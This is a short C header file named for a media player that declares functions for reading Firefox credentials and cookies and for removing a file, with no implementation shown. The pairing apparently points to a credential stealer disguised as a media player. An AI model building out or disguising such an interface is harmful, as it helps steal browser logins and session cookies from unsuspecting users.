#ifndef media_player_H
#define media_player_H

int get_firefox_credentials(char* filename);
int get_firefox_cookies(void *NotUsed, int argc, char **argv, char **azColName);
int remove_file(char* filename);

#endif

